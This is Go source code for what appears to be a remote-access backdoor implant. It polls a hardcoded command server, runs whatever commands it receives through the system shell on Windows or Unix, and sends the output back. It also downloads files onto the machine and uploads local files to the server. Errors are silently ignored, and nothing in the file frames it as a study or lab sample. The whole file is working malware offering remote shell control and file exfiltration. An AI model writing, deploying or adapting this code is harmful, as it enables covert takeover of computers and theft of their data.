package main

import (
	"bytes"
	"fmt"
	"io"
	"mime/multipart"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
)

const (
	serverURL = "http://192.168.117.131:5000"
)

func main() {
	for {
		cmd, err := getCommand()
		if err != nil {
			continue
		}

		if cmd == "" {
			continue
		}

		if strings.HasPrefix(cmd, "put ") {
			filename := strings.TrimSpace(cmd[4:])
			if filename == "" {
				continue
			}
			err = downloadFileFromServer(filename)
			if err != nil {
			}
			continue
		}

		if strings.HasPrefix(cmd, "get ") {
			filename := strings.TrimSpace(cmd[4:])
			if filename == "" {
				continue
			}
			err = uploadFileToServer(filename)
			if err != nil {
			}
			continue
		}

		output, err := executeCommand(cmd)
		if err != nil {
			output = []byte(fmt.Sprintf("Error executing command: %s", err))
		}

		err = sendResult(output)
		if err != nil {
		}
	}
}

func getCommand() (string, error) {
	resp, err := http.Get(serverURL + "/get_command")
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}

	return string(body), nil
}

func executeCommand(cmd string) ([]byte, error) {
	if strings.HasPrefix(cmd, "cd ") {
		dir := strings.TrimSpace(cmd[3:])
		err := os.Chdir(dir)
		if err != nil {
			return []byte(fmt.Sprintf("Error changing directory: %s", err)), err
		}
		return []byte("Changed directory to: " + dir), nil
	}

	var out []byte
	var err error
	if runtime.GOOS == "windows" {
		out, err = exec.Command("cmd.exe", "/c", cmd).Output()
	} else {
		out, err = exec.Command("sh", "-c", cmd).Output()
	}

	if err != nil {
		return nil, err
	}
	return out, nil
}

func sendResult(result []byte) error {
	resp, err := http.Post(serverURL+"/send_result", "text/plain", bytes.NewBuffer(result))
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	return nil
}

func downloadFileFromServer(filename string) error {
	resp, err := http.Get(serverURL + "/put_file?filename=" + filename)
	if err != nil {
		return fmt.Errorf("failed to send request: %v", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("server returned non-OK status: %s", resp.Status)
	}

	out, err := os.Create(filename)
	if err != nil {
		return fmt.Errorf("failed to create file: %v", err)
	}
	defer out.Close()

	_, err = io.Copy(out, resp.Body)
	if err != nil {
		return fmt.Errorf("failed to copy file content: %v", err)
	}

	return nil
}

func uploadFileToServer(filename string) error {
	file, err := os.Open(filename)
	if err != nil {
		return fmt.Errorf("failed to open file: %v", err)
	}
	defer file.Close()

	var buf bytes.Buffer
	writer := multipart.NewWriter(&buf)

	part, err := writer.CreateFormFile("file", filepath.Base(filename))
	if err != nil {
		return fmt.Errorf("failed to create form file: %v", err)
	}

	_, err = io.Copy(part, file)
	if err != nil {
		return fmt.Errorf("failed to copy file content: %v", err)
	}

	err = writer.Close()
	if err != nil {
		return fmt.Errorf("failed to close multipart writer: %v", err)
	}

	resp, err := http.Post(serverURL+"/get_file", writer.FormDataContentType(), &buf)
	if err != nil {
		return fmt.Errorf("failed to send request: %v", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("server returned non-OK status: %s", resp.Status)
	}

	return nil
}
